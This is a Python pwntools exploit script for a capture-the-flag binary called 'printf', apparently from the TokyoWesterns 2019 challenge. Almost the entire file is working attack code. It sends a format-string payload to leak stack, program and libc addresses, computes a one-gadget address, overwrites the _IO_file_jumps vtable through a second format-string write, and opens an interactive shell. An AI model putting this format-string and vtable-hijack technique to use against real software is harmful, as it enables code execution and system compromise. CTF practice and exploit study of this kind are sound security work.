from pwn import *


binpath = './printf'
libcpath = './libc.so.6'
elf = ELF(binpath)
libc = ELF(libcpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
# before puts
b *(0x0000555555554000+0x2940)
# before alloca
b *(0x0000555555554000+0x1C81)
# after returning from last printf
b *(0x0000555555554000+0x12F2)
ignore 1 2
ignore 2 3
source cmd
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)

gdbscript_p = '''
gef
source cmd
'''
# use provided ld.so.2 and libc to execute
# https://blog.bushwhackers.ru/tokyo2019-printf/
io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", binpath])
# io = process(binpath)

io.recvuntil(b"What's your name?\n")
payload = b''
payload += b'%lx ' * 0x30
io.sendline(payload)

io.recvuntil(b"Hi")
io.recvline()
leaked = io.recvline().split(b" ")
addr_rsp = int(leaked[0x27], 16) - 0x378  # offset depends on libc version
addr_prog  = int(leaked[0x22], 16) - 0x2a85
addr_libc = int(leaked[0x2a], 16) - 0x26b6b
print("addr_rsp = 0x{:x}".format(addr_rsp))
print("addr_prog = 0x{:x}".format(addr_prog))
print("addr_libc = 0x{:x}".format(addr_libc))

io.recvuntil(b'Do you leave a comment?')

gadget_offsets = [926591, 926595, 926598, 1076984]
addr_gadget = addr_libc + gadget_offsets[3]
addr_xsputn = addr_libc + 0x8ebd5
print("addr_gadget = 0x{:x}".format(addr_gadget))
print("addr_xsputn = 0x{:x}".format(addr_xsputn))

addr_target = addr_libc + 0x1e6588  # _IO_file_jumps
print("addr_target = 0x{:x}".format(addr_target))
payload = b''
payload += b'%%%dc' % (addr_rsp  - addr_target - 0x20)
payload += b'P' * (0x1d - len(payload) + 0x8)
payload += p64(addr_gadget)
payload += p64(0x0)
print("Send", )
print(payload)
print("len payload: 0x{:x}".format(len(payload)))

io.send(payload)

io.interactive()
